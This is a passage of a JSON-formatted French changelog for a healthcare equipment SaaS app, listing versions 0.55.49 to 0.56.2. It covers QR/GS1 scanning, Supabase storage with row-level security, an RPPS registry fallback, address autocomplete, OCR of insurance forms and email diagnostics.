      { "code": "FE", "txt": "Nouveau parser /lib/qrParser.js : détecte automatiquement le type du contenu scanné en 8 catégories — empty / url / url_aveho (interne) / vcard / wifi / vitale_qr (NIR détecté) / gs1 (Application Identifiers GS1/UDI) / ean (EAN-8 ou EAN-13) / text. Retourne une structure normalisée avec label et données extraites" },
      { "code": "FE", "txt": "Parser Vitale : regex sur le NIR français (1 chiffre sexe + 2 année + 2 mois + 2-3 lieu + 3 commune + 3 ordre + 2 clé). Extrait NIR, sexe (1=M, 2=F), année et mois de naissance. Heuristique : ne prétend pas décoder le vrai format DGE-MSS Vitale (cryptographique) mais détecte au minimum la présence d'un NIR" },
      { "code": "FE", "txt": "Parser GS1/UDI : regex sur les Application Identifiers entre parenthèses. Mappe les AI connus (01=GTIN, 10=Lot, 17=Péremption, 21=Serial, 11=Date fab, 240=Réf additionnelle) vers leurs libellés. Retourne ais_labeled prêt à afficher dans un tableau" },
      { "code": "FE", "txt": "Page /scan/qr refondue (348 lignes, vs 49 placeholder) : intégration du composant QrScanner + parser + actions contextuelles. État scanning/parsed/history, historique des 10 derniers scans cliquables, auto-navigate vers /patient/X si url_aveho détectée" },
      { "code": "FE", "txt": "Affichage spécifique par type avec actions contextuelles : (1) Vitale → chercher patient par NIR ou créer nouveau patient avec ce NIR pré-rempli + avertissement 'NIR seul ne suffit pas', (2) GS1/UDI → tableau des AI avec libellés + chercher matériel par GTIN, (3) EAN → chercher matériel par EAN, (4) URL Aveho → redirection auto, (5) URL externe → bouton ouvrir, (6) vCard → carte contact, (7) WiFi → SSID+type, (8) Texte → bouton copier" },
      { "code": "FE", "txt": "Badges colorés par type (vitale vert, GS1 bleu, EAN violet, URL Aveho vert, URL bleu, vCard ambre, WiFi ambre, texte gris). Panneau pédagogie en bas listant tous les types reconnus avec leur badge. Section 'contenu brut' dépliable dans chaque résultat pour debug" },
      { "code": "AI", "txt": "+32 tests Vitest : Parser qrParser (10 : empty, url, url_aveho, vcard, wifi, vitale M, vitale F, GS1 avec 4 AIs, EAN-13 et EAN-8, texte fallback), Composant QrScanner (8 : exists, dynamic import, caméra arrière prefer, multiple cameras, scan from file, cleanup, props, qrbox responsive), Page /scan/qr (12 : imports, state, auto-navigate, rescan, affichage par type, historique 10, pédagogie, avertissement NIR), package.json (2 : html5-qrcode + version). Total 1714 tests verts (vs 1682)" }
    ],
    "themes": ["scan", "patient", "materiel", "ui_ux"],
    "date": "1er juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.56.2.html",
    "sqlFile": null
  },
  {
    "v": "0.56.1",
    "kind": "version",
    "titre": "📦 Storage Supabase pour archiver les bulletins scannés · bucket privé RLS + URL signées + page admin avec stats coûts Claude",
    "chantiers": [
      { "code": "SQL", "txt": "Création du bucket Storage 'bulletins-scannes' (privé, max 10 Mo/fichier, MIME image/* + PDF) avec 4 policies RLS isolant par structure_id (premier segment du path). Convention de path : {structure_id}/{patient_id}/{timestamp}-{filename_safe}. Idempotent via ON CONFLICT DO UPDATE" },
      { "code": "SQL", "txt": "6 nouvelles colonnes audit sur patients : bs_file_path (chemin Storage), bs_file_mime, bs_file_size_kb, bs_ocr_tokens_in, bs_ocr_tokens_out, bs_ocr_confiance. Index partiel idx_patients_bs_archive (structure_id, bs_ocr_date desc) where bs_file_path is not null. RPC bulletins_archive_stats() security definer pour les stats agrégées par structure" },
      { "code": "FE", "txt": "Nouveau helper lib/bulletinsStorage.js : uploadBulletin(file, structureId, patientId) avec sanitize filename (lowercase + chars safe), getSignedUrl(path, expiresIn=3600) pour générer un lien temporaire 1h, deleteBulletin(path) pour suppression admin. Retourne { path, size_kb, mime, error? }" },
      { "code": "FE", "txt": "Workflow /scan/bulletin-situation refondu : après création du patient via /api/patients/from-ocr, on upload AUTOMATIQUEMENT le fichier original dans le bucket avec le patient_id, puis on update le patient avec bs_file_path + bs_file_mime + bs_file_size_kb. Si l'archivage échoue, affichage d'un warning ambré non bloquant (le patient est créé). Badge bleu 'Bulletin archivé dans Storage' sur l'étape 'done'" },
      { "code": "BE", "txt": "Route /api/patients/from-ocr étendue : accepte maintenant ocr_confiance, ocr_tokens_in, ocr_tokens_out depuis le body. Stockés dans bs_ocr_confiance/tokens_in/tokens_out pour audit coût IA et traçabilité de la qualité d'extraction" },
      { "code": "FE", "txt": "Onglet Audit de la fiche patient (/patient/[id]/edit) refondu : génère une URL signée à l'ouverture de la page (1h validité), affiche un preview image direct si MIME image/* (click pour zoom plein écran), bouton 'Ouvrir le PDF' avec icône si PDF, ou lien externe pour autres formats. Affiche aussi confiance OCR (badge coloré), tokens IN/OUT, taille Ko, type MIME. Compat conservée avec l'ancien format bs_file_url (mention 'ancien format')" },
      { "code": "FE", "txt": "Nouvelle page /admin/bulletins-archive : (1) KPI bulletins archivés + espace utilisé en Ko/Mo + premier/dernier archive + tokens IN/OUT cumulés, (2) estimation coût Claude Sonnet 4 (3$/M IN + 15$/M OUT × 0.92 EUR/USD), (3) liste des 200 derniers patients avec bulletin (filtre live nom/prénom/dossier + badges confiance coloré + tokens), (4) bouton 'Voir' redirige vers /patient/[id]/edit?tab=audit, (5) panneau pédagogique confidentialité RLS + URL signées 1h" },
      { "code": "FE", "txt": "Entrée menu Administration : 'Bulletins archivés' (ti-archive bleu) entre 'Dump RPPS (Plan B)' et 'Diagnostic envoi mail'" },
      { "code": "AI", "txt": "+40 tests Vitest : SQL bucket + RLS + colonnes (10), helper bulletinsStorage (6), intégration workflow scan (5), API from-ocr méta (2), TabAudit preview signée (7), Page admin archive (9), Menu (1). Total 1682 tests verts (vs 1642)" }
    ],
    "themes": ["storage", "patient", "admin", "ai"],
    "date": "1er juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.56.1.html",
    "sqlFile": "aveho-PATCH-vers-0.56.1.sql"
  },
  {
    "v": "0.56.0",
    "kind": "milestone",
    "titre": "🎯 Version majeure 0.56 — Cycle 0.55 terminé · 56 versions · 1631 tests verts · plateforme SaaS PSAD prête",
    "chantiers": [
      { "code": "MILESTONE", "txt": "Clôture du cycle 0.55.X après 56 versions consécutives (0.55.0 → 0.55.56) sans cassure de build ni régression. Service Worker bumpé 66× de suite, format unifié des réponses API, RLS Supabase partout, 1628 tests Vitest verts avant cette release, 0 console.warn/log/info résiduels" },
      { "code": "FE", "txt": "Nouvelle page /v056 : récap visuel des 8 piliers fonctionnels atteints (gestion matériel & patients, fiche patient niveau bulletin de situation, OCR Claude Vision, géolocalisation BAN INSEE, référentiels santé intégrés, administration & diagnostic, robustesse & performance, tests & qualité). 4 KPI live de la base (caisses, mutuelles, patients, établissements). Parcours de découverte vers /scan/bulletin-situation, /patients, /carte, /changelog. Roadmap 0.56.X annoncée (storage Supabase, scan QR/codebarre, OCR prescriptions)" },
      { "code": "FE", "txt": "Page accueil : nouvelle tuile 'Aveho EC 0.56' avec badge NEW vert dégradé dans les raccourcis. Lien direct vers /v056 pour découvrir tout ce que l'app sait faire" },
      { "code": "DOC", "txt": "Cycle 0.55 récapitulé : ce cycle a apporté l'OCR de bulletin de situation via Claude Vision (40+ champs auto en 10s), l'autocomplete d'adresse BAN INSEE intégré dans 3 emplacements, la fiche patient édition à 6 onglets (identité/sécu/adresses/contacts/médecin/audit), 1-N adresses de livraison par patient, le système anti-doublon établissements + groupements, 105 caisses + 44 mutuelles seedées, le Plan B RPPS avec fallback automatique sur dump local quand l'API ANS est bloquée, le diagnostic Resend pour les invitations, la robustesse de toutes les routes API (maxDuration + AbortController + plus jamais de 502), et 56 itérations de stabilisation" },
      { "code": "FE", "txt": "Bump majeur 0.55.56 → 0.56.0 — passage en cycle 0.56.X qui se concentrera sur les flux 'temps réel' (scan QR Vitale, scan code-barre matériel GS1/UDI, OCR prescriptions, storage Supabase pour archivage documents, sync Google reviews)" },
      { "code": "AI", "txt": "+3 tests Vitest : page /v056 chargée, KPI live calculés, tuile NEW accueil. Total 1631 tests verts (vs 1628)" }
    ],
    "themes": ["milestone", "ui_ux", "doc"],
    "date": "1er juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.56.0.html",
    "sqlFile": null
  },
  {
    "v": "0.55.56",
    "kind": "version",
    "titre": "🔄 Plan B RPPS : fallback automatique sur dump local quand l'API ANS plante · admin seed CSV par batchs · /api/rpps source ANS ou dump_local transparent",
    "chantiers": [
      { "code": "SQL", "txt": "Patch 0.55.56 : nouvelle table rpps_dump (PK rpps 11 chiffres) avec 23 colonnes (état civil, profession, spécialité, lieu d'exercice complet, coords lat/lng, code INSEE commune). Indices full-text français + index par nom/profession/cp/insee/coords (partiels where not null). Table rpps_dump_meta single-row pour stocker statut et date d'extrait" },
      { "code": "SQL", "txt": "Fonctions RPC : search_rpps_local(q, profession, cp, ville, limit) security definer — recherche filtrée dans le dump avec retour normalisé. rpps_dump_status() retourne total_records + source_extract_date + last_seed_at + age_jours. RLS lecture publique authenticated, écriture via RPC security definer" },
      { "code": "SQL", "txt": "Patch SUITE 0.55.56-rpc : upsert_rpps_dump_batch(rows jsonb) qui ingère jusqu'à 5000 lignes via jsonb_to_recordset + ON CONFLICT (rpps) DO UPDATE. rpps_dump_truncate() pour vider avant un seed complet. rpps_dump_meta_update() pour marquer statut idle/seeding/completed/failed + message" },
      { "code": "BE", "txt": "Route /api/rpps refondue : maxDuration 30s + dynamic force-dynamic + nouvelle fonction fallbackToLocalDump(). Appelée à 3 endroits : (1) mode RPPS exact si ANS KO, (2) multi-query si toutes les sous-requêtes ANS échouent, (3) ANS répond OK mais 0 résultat après filtrage. Format de retour identique à ANS avec champs source='ANS FHIR' ou source='dump_local' + fallback_reason pour debug" },
      { "code": "BE", "txt": "fallbackToLocalDump : importe createClient Supabase dynamiquement, appelle RPC search_rpps_local, normalise les résultats au format ANS (nom/prenom/profession/cp/commune/lat/lng) avec source_record='dump_local' marqué sur chaque ligne. Catch toutes les exceptions, retourne {ok, count, results, duration_ms, fallback_reason}" },
      { "code": "BE", "txt": "Nouvelle route /api/rpps/dump-status : GET qui appelle la RPC rpps_dump_status et retourne {ok, total_records, source_extract_date, last_seed_at, seed_status, seed_message, age_jours, is_fresh (âge<60j), empty (records=0)}. Utilisée par la page admin de pilotage" },
      { "code": "FE", "txt": "Nouvelle page /admin/rpps-dump : (1) carte d'état coloré (vert si fresh, ambre si vieux, rouge si vide) avec KPI records/extract date/last seed/âge jours/statut, (2) zone upload CSV avec parser intégré qui détecte automatiquement le séparateur (;/,/\\t) et fait un mapping flexible des colonnes (identification nationale RPPS, nom d'exercice, prénom d'exercice, libellé profession, etc.), (3) progress bar live + log dépliable, (4) section test fallback avec query libre qui affiche source/durée/fallback_reason, (5) panneau pédagogique workflow" },
      { "code": "FE", "txt": "Page admin : parsing côté client par batchs de 5000 lignes, appel RPC upsert_rpps_dump_batch par batch, yield 10ms entre chaque pour ne pas freezer l'UI, comptage erreurs + total inséré. Truncate de la table avant le seed pour repartir propre. Mise à jour du méta avec statut completed/failed à la fin. Compatible fichiers ~500 Mo en mémoire navigateur" },
      { "code": "FE", "txt": "Entrée menu Administration : 'Dump RPPS (Plan B)' (ti-database-import vert) entre Diagnostic API RPPS et Diagnostic envoi mail" },
      { "code": "AI", "txt": "+29 tests Vitest : SQL (8 : table+PK, colonnes, méta single-row, indices, search_rpps_local, dump_status, RLS, upsert_rpps_dump_batch+truncate+meta_update), Route fallback (6 : maxDuration, fonction fallback, appelée 3× minimum, source dump_local, fallback_reason, normalisation), Route status (3 : exists, RPC, is_fresh+empty), Page admin (10 : exists, statut, upload, séparateur, mapping, batch+RPC, truncate, progress+log, test fallback, meta_update), Menu (1). Total 1628 tests verts (vs 1599)" }
    ],
    "themes": ["rpps", "ai", "ui_ux", "admin"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.55.56.html",
    "sqlFile": "aveho-PATCH-vers-0.55.56.sql"
  },
  {
    "v": "0.55.55",
    "kind": "version",
    "titre": "📍 AdresseAutocomplete BAN INSEE · auto-fill cp + ville + code commune + lat/lng · intégré dans /patients (modale rapide) et /patient/[id]/edit (3 emplacements)",
    "chantiers": [
      { "code": "FE", "txt": "Nouveau composant /app/AdresseAutocomplete.js — autocomplete d'adresse via l'API officielle BAN (Base Adresse Nationale, api-adresse.data.gouv.fr). Gratuite, illimitée, sans clé. Debounce 300ms, min 3 caractères, max 8 suggestions. Restriction par code postal possible (postcode param)" },
      { "code": "FE", "txt": "Composant : dropdown stylé avec badges colorés par type (Numéro vert/Rue bleu/Lieu-dit violet/Commune ambre), affichage contexte (département, région), code INSEE 5 chiffres en mono à droite. Source 'data.gouv.fr' mentionnée en pied de dropdown. Click outside ferme. Loader spin pendant fetch" },
      { "code": "FE", "txt": "onSelect renvoie un objet complet : {adresse, code_postal, ville, code_insee (5 chiffres commune), latitude, longitude, label, context, type}. Pas besoin de saisir cp/ville à la main, tout est rempli en 1 clic" },
      { "code": "FE", "txt": "/patients (liste, modale création/édition rapide) : nouveau bloc 'Adresse (recherche BAN)' avec autocomplete + ligne (cp + ville). Si l'user sélectionne une suggestion, tous les champs se remplissent automatiquement (adresse, cp, ville, code_insee_residence, latitude, longitude). Petite aide 'Pour l'adresse complète + livraisons, va dans Édition complète'" },
      { "code": "FE", "txt": "Save() de /patients étendu : payload inclut maintenant adresse, code_postal, ville, code_insee_residence, latitude, longitude. Compatible offline (safeWrite)" },
      { "code": "FE", "txt": "/patient/[id]/edit — onglet Identité : lieu de naissance avec autocomplete commune INSEE. Champs séparés village + code_insee_pays. Quand l'user choisit Paris dans le dropdown, code_insee=75056 se remplit auto" },
      { "code": "FE", "txt": "/patient/[id]/edit — onglet Adresses : adresse principale avec autocomplete BAN qui remplit cp/ville/code_insee_residence/lat/lng. Champs séparés visibles juste après pour ajustement manuel si besoin. + code_insee_residence champ visible (rempli auto, modifiable)" },
      { "code": "FE", "txt": "/patient/[id]/edit — onglet Adresses : adresses de LIVRAISON 1-N utilisent aussi le BAN autocomplete (compact). Si tu tapes une adresse, cp + ville se remplissent automatiquement par adresse" },
      { "code": "SQL", "txt": "Patch 0.55.55 : ajout colonnes idempotentes code_insee_residence text, latitude numeric(10,7), longitude numeric(10,7) sur patients. Index partiels idx_patients_code_insee (where not null) et idx_patients_coords (lat+lng where not null) pour requêtes géo futures" },
      { "code": "AI", "txt": "+22 tests Vitest : composant BAN (10 : exists, API gouv, debounce, min 3 chars, params, postcode, code_insee, lat/lng, badges, source), intégration /patients (4 : import, champ, save payload, aide), intégration /patient/edit (4 : import, identité, adresse principale, livraison 1-N), SQL (4 : colonnes, index, idempotent). Total 1599 tests verts (vs 1577)" }
    ],
    "themes": ["patient", "ui_ux"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.55.55.html",
    "sqlFile": "aveho-PATCH-vers-0.55.55.sql"
  },
  {
    "v": "0.55.54",
    "kind": "version",
    "titre": "🧭 Clarification routes patient : /patient (nu) redirige vers /patients · fil d'Ariane sur fiche et édition",
    "chantiers": [
      { "code": "DOC", "txt": "Précision : il n'y a PAS 2 pages patient. /patients (pluriel) = la LISTE des patients (KPI + tableau + création), accessible depuis le menu. /patient/[id] (singulier + id) = la FICHE 360° d'un patient sélectionné, qui s'ouvre en cliquant sur une ligne du tableau ou via la palette de recherche globale (pas en menu — ça n'aurait pas de sens). Le menu de gauche n'a qu'UNE entrée 'Patients' au pluriel" },
      { "code": "FE", "txt": "Nouveau /patient/page.js : si quelqu'un tape l'URL /patient nue (sans id) → redirect automatique vers /patients (la liste). Plus de page blanche ou 404 dans ce cas" },
      { "code": "FE", "txt": "Fil d'Ariane ajouté en haut de la fiche /patient/[id] : '← Tous les patients / Fiche de Jean DUPONT'. Bouton retour stylé avec hover underline" },
      { "code": "FE", "txt": "Fil d'Ariane sur /patient/[id]/edit : '← Tous les patients / Fiche Jean DUPONT / Édition'. Permet de naviguer en arrière sans utiliser le bouton navigateur" },
      { "code": "AI", "txt": "+9 tests Vitest : redirect /patient → /patients, fil d'Ariane fiche (3), fil d'Ariane édition (3), pas de doublon menu (2). Total 1577 tests verts (vs 1568)" }
    ],
    "themes": ["ui_ux", "patient"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.55.54.html",
    "sqlFile": null
  },
  {
    "v": "0.55.53",
    "kind": "hotfix",
    "titre": "📧 Fix critique invitation : capture erreur Resend + page /admin/mail-diagnostic + bandeau alerte mail non envoyé",
    "chantiers": [
      { "code": "FIX", "txt": "Bug critique : les invitations ne partent plus, mais l'app annonce 'Invitation envoyée'. Cause : supabase.functions.invoke() ne throw pas en cas d'erreur Resend — il retourne {data, error}, et l'ancien code attrapait seulement les exceptions JS, pas les retours error" },
      { "code": "FE", "txt": "App utilisateurs sendInvite() : capture maintenant {data: invokeData, error: invokeErr}. Si invokeErr, on lit le body de l'erreur (FunctionsHttpError contient un readableStream) via TextDecoder pour extraire le message exact retourné par l'Edge Function. Stocke un mailWarning dans createdInviteLink" },
      { "code": "FE", "txt": "Popup d'invitation : si mailWarning présent, le header passe d'ambré 'mail NON envoyé' (au lieu de vert 'créée'), bandeau rouge explicatif avec la raison Resend exacte + conseil 'copie le lien et envoie-le manuellement (SMS/WhatsApp/mail perso). L'invitation Aveho est bien créée en base'" },
      { "code": "BE", "txt": "Edge Function invite-user v2 : diagnostic complet. Détecte RESEND_API_KEY manquante (msg explicite avec lien Supabase Secrets), décode validation_error mode test Resend (testing emails restriction → message expliquant la vérif de domaine), 401/403 (clé invalide), 429 (rate limit 3000/mois)" },
      { "code": "BE", "txt": "Edge Function v2 : retour enrichi {ok, diagnostic, error, resend_status, resend_body, from_address, to, duration_ms, resend_id?}. Support nouveau secret RESEND_FROM configurable (par défaut 'Aveho EC <onboarding@resend.dev>') pour utiliser une adresse de domaine vérifié" },
      { "code": "FE", "txt": "Nouvelle page /admin/mail-diagnostic : tape un email → l'Edge Function tente l'envoi → affichage détaillé (résultat OK/KO coloré, diagnostic code mono, HTTP status Resend, from/to, durée, body brut dépliable). Panneau pédagogique en bas listant les 5 causes courantes avec leur solution exacte et liens vers resend.com/api-keys et resend.com/domains" },
      { "code": "FE", "txt": "Entrée menu Administration : 'Diagnostic envoi mail' (ti-mail-cog rouge) juste après 'Diagnostic API RPPS'" },
      { "code": "AI", "txt": "+20 tests Vitest : Edge Function v2 (8 : missing_key, RESEND_FROM, test mode, 401/403, 429, diagnostic+status+from/to/body, resend_id, liens doc), App capture invoke (5 : data+error, lecture body, mailWarning, popup ambré, conseil envoi manuel), Page diagnostic (6 : existe, invoke, décode body, KV affichage, pédagogie, liens), Menu (1). Total 1568 tests verts (vs 1548)" }
    ],
    "themes": ["fixes", "users"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-HOTFIX-Alpha-0.55.53.html",
    "sqlFile": null
  },
  {
    "v": "0.55.52",
    "kind": "hotfix",
    "titre": "🩹 Fix Service Worker · TypeError chrome-extension scheme · helper safeCachePut",
    "chantiers": [
      { "code": "FIX", "txt": "Bug Service Worker : TypeError 'Failed to execute put on Cache: Request scheme chrome-extension is unsupported'. Les extensions navigateur (LastPass, Dashlane, Grammarly, MetaMask, Honey, etc.) injectent des scripts qui font des requêtes vers chrome-extension://..., moz-extension://..., etc. Ces requêtes passent par le SW de la page mais cache.put() refuse les schémas non-http(s) → throw" },
      { "code": "FE", "txt": "Fix SW : early return dans le handler fetch si req.url ne commence pas par http:// ou https:// — on laisse le navigateur faire son fetch normal sans interception. Couvre chrome-extension, moz-extension, safari-extension, data:, blob:, ws://, wss://, file://" },
      { "code": "FE", "txt": "Ceinture + bretelle : nouveau helper safeCachePut(cache, req, res) qui wrap tous les cache.put() avec try/catch silencieux. Vérifie aussi le schéma de l'URL avant put + ignore les responses opaques (no-cors qu'on ne peut pas servir correctement). Pas de console.error pour éviter le bruit" },
      { "code": "FE", "txt": "cacheFirst, networkFirst (success + retry path), et staleWhileRevalidate utilisent tous safeCachePut maintenant. Plus aucun appel direct à cache.put() qui pourrait throw" },
      { "code": "AI", "txt": "+9 tests Vitest : early return schémas non-http, safeCachePut existe, filtre schémas, ignore opaques, silent fail (pas de console.error), utilisé dans cacheFirst/networkFirst/staleWhileRevalidate, commentaire chrome-extension. Total 1548 tests verts (vs 1539)" }
    ],
    "themes": ["fixes"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-HOTFIX-Alpha-0.55.52.html",
    "sqlFile": null
  },
  {
    "v": "0.55.51",
    "kind": "version",
    "titre": "🔧 Fix API SIRENE 502 (maxDuration + AbortController) · Pages stub QR/Code-barre · OCR générique avec Claude Vision",
    "chantiers": [
      { "code": "FIX", "txt": "Bug critique : /api/sirene retournait régulièrement HTTP 502 Bad Gateway en production (vu dans les logs Vercel). Cause : aucune limite maxDuration côté serverless + aucun AbortController côté code → Vercel killait la requête à 10s par défaut, renvoyant 502" },
      { "code": "BE", "txt": "Fix /api/sirene : maxDuration = 30s + dynamic = 'force-dynamic' + AbortController interne 25s (avant le 30s Vercel). Plus AUCUN retour 502 — toutes les erreurs (timeout, network, HTTP not-ok) sont catchées et retournent 200 avec ok:false + message explicite. Format unifié { ok, count, results, error?, duration_ms, timeout? }" },
      { "code": "BE", "txt": "/api/sirene : limite max remontée de 20 → 50 (le user demandait limit=25, ignoré silencieusement avant). User-Agent 'Aveho-EC/0.55' ajouté pour traçabilité. Support param 'commune' (en plus de 'code_postal') pour recherche par nom de ville. Message timeout pédagogique : 'Timeout SIRENE >25s — la requête est trop lourde, essaie avec plus de critères'" },
      { "code": "BE", "txt": "/api/finess : ajout maxDuration = 30s + dynamic = 'force-dynamic' pour éviter le même bug 502 sur les requêtes lourdes" },
      { "code": "FE", "txt": "Nouvelle page /scan/qr (stub) : placeholder qui liste les futurs usages (QR Vitale, étiquettes patient, étabs, matériel, adresses). Stack prévue : html5-qrcode + caméra native" },
      { "code": "FE", "txt": "Nouvelle page /scan/codebarre (stub) : placeholder pour scan GS1/UDI matériel médical, EAN-13, LPP, codes parc Aveho EC. Stack prévue : ZXing + parser Application Identifiers" },
      { "code": "FE", "txt": "Nouvelle page /scan/ocr GÉNÉRIQUE (fonctionnelle) : upload n'importe quel document (prescription, facture, courrier…) → Claude Vision retourne le texte brut. Différence avec /scan/bulletin-situation : pas de schéma JSON forcé, juste l'extraction libre. Textarea éditable + bouton 'Copier dans le presse-papier' + tokens IN/OUT affichés" },
      { "code": "BE", "txt": "Nouvelle route /api/ocr/generic : prompt simple 'Extrais TOUT le texte visible, conserve la structure naturelle, sans markdown'. Modèle claude-sonnet-4, max_tokens 4096, maxDuration 60s. Si image illisible, retourne '(aucun texte détecté)'" },
      { "code": "AI", "txt": "+27 tests Vitest : Fix SIRENE (10 : maxDuration, dynamic, AbortController, no 502, format unifié, limite 50, msg timeout, UA, commune, duration_ms), Fix FINESS (2), Pages stub QR/Code-barre (4 : exist + contenu mentionné), OCR générique page (6 : upload, preview, fetch, textarea, copy, limite, capture), Route OCR générique (5 : env, prompt libre, max_duration, sonnet 4, tokens). Total 1539 tests verts (vs 1512)" }
    ],
    "themes": ["fixes", "ai", "ui_ux"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.55.51.html",
    "sqlFile": null
  },
  {
    "v": "0.55.50",
    "kind": "version",
    "titre": "🤖 OCR bulletin de situation via Claude Vision · 40+ champs extraits automatiquement · Auto-link caisse + mutuelle · Patient créé en 1 photo",
    "chantiers": [
      { "code": "BE", "txt": "Nouvelle route /api/ocr/bulletin-situation : reçoit une image (jpg/png/webp/pdf en base64) et l'envoie à Claude Sonnet 4 via l'API Anthropic (/v1/messages, header anthropic-version 2023-06-01, max_tokens 4096, maxDuration Vercel 60s). Nécessite ANTHROPIC_API_KEY dans les env Vercel" },
      { "code": "BE", "txt": "Prompt structuré (190 lignes) qui demande à Claude d'extraire 40+ champs en JSON strict sans markdown : nom, prenom, nom_naissance, sexe, date_naissance, lieu_naissance ville/code_insee/pays, nationalite, numero_secu (NIR 13 ou 15 chiffres), cle_nir, code_organisme_rattachement, nom_caisse, centre_paiement, regime_secu, qualite_assure, rang_naissance, date_debut/fin_droits, ALD avec commentaire, CMU_C, C2S, AME, mutuelle_nom, mutuelle_numero_amc, mutuelle_numero_adherent, adresse complète, telephones, email, medecin_traitant nom/prenom/RPPS, etablissement_emetteur, date_emission, date_entree/sortie hospit, service, ocr_text_brut (audit), confiance (haute/moyenne/faible)" },
      { "code": "BE", "txt": "Anti-hallucination : prompt explicite 'Ne devine PAS, mets null si pas sûr'. Cleanup automatique des ```json ... ``` au cas où Claude oublie. Si Claude détecte une image illisible/pas un BS → retourne {erreur, ocr_text_brut}. Retour enrichi : tokens IN/OUT pour audit coût, durée ms, modèle utilisé" },
      { "code": "BE", "txt": "Nouvelle route /api/patients/from-ocr : crée le patient à partir des données OCR. Auto-link intelligent : caisse via code_organisme exact (3 premiers chiffres) puis fallback ilike sur nom_caisse, mutuelle via numero_amc exact puis fallback ilike sur raison_sociale. source_creation='ocr_bs', bs_ocr_brut et bs_ocr_date stockés pour audit. Concaténation NIR + clé si séparées" },
      { "code": "FE", "txt": "Page /scan/bulletin-situation REFONDUE — workflow 4 étapes avec stepper visuel : (1) Upload drag&drop + camera mobile (capture='environment' pour ouvrir l'appareil photo direct sur smartphone), formats jpg/png/webp/pdf max 8 Mo, aperçu image avant lancement. (2) Loader 'OCR en cours' avec animation spinner pendant 5-15s d'analyse. (3) Vérification : aperçu image à gauche + formulaire éditable à droite avec sections Identité/Sécu/Mutuelle/Adresse/Médecin, badge confiance coloré (vert/ambre), tokens affichés, OCR brut dépliable. (4) Done : confirmation + bouton 'Compléter la fiche' (redirige vers /patient/[id]/edit) + 'Scanner un autre'" },
      { "code": "FE", "txt": "Champs éditables avant création : si l'OCR a mal lu un caractère, le user corrige avant de valider. Stats référentiels en bas (X caisses, Y mutuelles) pour montrer ce qui est disponible pour auto-liaison" },
      { "code": "AI", "txt": "+35 tests Vitest : route OCR (13 : exists, env var, Claude Sonnet 4, max_tokens, endpoint, header version, types acceptés, prompt JSON strict, champs critiques NIR/AMC/ALD, ocr brut + confiance, cleanup ```, tokens IN/OUT, maxDuration), route from-ocr (7 : auto-link caisse code/nom, mutuelle amc/nom, structure_id, source ocr_bs, bs brut+date, concat NIR), page 4 étapes (12 : workflow, drag&drop+camera, limite, calls APIs+token, édition, aperçu, badge confiance, tokens, brut dépliable, redirect, stats), prompt (3 : 30+ champs, anti-hallucination, ISO date). Total 1512 tests verts (vs 1477)" }
    ],
    "themes": ["patient", "ai", "ui_ux"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.55.50.html",
    "sqlFile": null
  },
  {
    "v": "0.55.49",
    "kind": "version",
    "titre": "👤 Nouvelle page édition fiche patient avec 6 onglets · Intégration CaisseSearch + MutuelleSearch · Gestion 1-N adresses livraison · Fix carte recherche libre (affichage 100%)",
    "chantiers": [
      { "code": "FE", "txt": "Nouvelle page /patient/[id]/edit : édition COMPLÈTE de la fiche patient niveau bulletin de situation. 6 onglets : 🪪 Identité (nom, prenom, nom_naissance, sexe, date+lieu naissance, nationalité, n° dossier), 🛡 Sécu & Mutuelle, 📍 Adresses livraison, 📞 Contacts urgence + personne confiance, 🩺 Médecin traitant, 📄 OCR & audit" },
      { "code": "FE", "txt": "Onglet Sécu : numéro_secu NIR 15 chiffres mono, régime (général/agricole/militaire/fonctionnaire/spécial), qualité (assuré/ayant droit), rang naissance, centre paiement, date début/fin droits, toggles ALD/C2S/AME (avec commentaire ALD conditionnel). Intégration CaisseSearch live — sélection caisse affiche carte bleue avec nom, code, type, dept" },
      { "code": "FE", "txt": "Onglet Mutuelle (dans Sécu) : intégration MutuelleSearch live avec badge couleur type (mutuelle vert / assurance bleu / IP violet) + badge C2S, n° AMC 8 chiffres mono, n° adhérent, dates début/fin droits, tiers payant actif" },
      { "code": "FE", "txt": "Onglet Adresses : adresse principale (sociale) avec rue, complement, cp, ville, pays. Section verte 'Adresses de livraison' 1-N avec ajout/édition/suppression inline : libelle (Domicile/Travail/Maison campagne), destinataire si différent (ex 'Mme X, sa fille'), code_porte digicode mono, instructions livraison ('Sonner 2x'), case 'Principale'. Boutons Sauv. par adresse" },
      { "code": "FE", "txt": "Onglet Contacts : téléphone fixe + portable + email du patient, section ambre 'Personne à prévenir (urgence)' avec nom/prenom/lien parenté/tel, section violette 'Personne de confiance' (loi 4 mars 2002) avec nom/prenom/tel + bandeau pédagogique" },
      { "code": "FE", "txt": "Onglet Médecin traitant : nom, prenom, téléphone, RPPS 11 chiffres mono, FINESS établissement mono, bandeau pédagogique sur le parcours de soins coordonné" },
      { "code": "FE", "txt": "Onglet Audit/OCR : source_creation (manuelle/ocr_bs/import_csv avec emoji), created_at, updated_at, bs_file_url (lien externe vers bulletin scanné), bs_ocr_brut (dépliable avec pre dark si OCR effectué)" },
      { "code": "FE", "txt": "Footer sticky en bas : 'Sauvegardé à HH:MM' + bouton 'Retour fiche' + bouton vert 'Sauvegarder' (loader durant save). Composants Field (input avec label), FieldSelect (dropdown), Toggle (booléens colorés ALD/C2S/AME), KvBlock pour les sections read-only" },
      { "code": "FE", "txt": "Bouton 'Édition complète' ajouté sur la fiche /patient/[id] qui pointe maintenant vers la nouvelle page edit (au lieu de rediriger vers la liste)" },
      { "code": "FIX", "txt": "Carte : recherche libre — bug 'visibles 0' corrigé. Le filtre bbox était trop strict : SIRENE/FINESS sans coords sortaient toujours du filtre. Nouveau : on affiche TOUS les résultats avec coords (sans filtre bbox) ET on auto-fit la carte sur les résultats trouvés. L'user voit immédiatement ce qu'il cherche, où qu'il soit. Console log enrichi : 'total avec coords X / affichés Y'" },
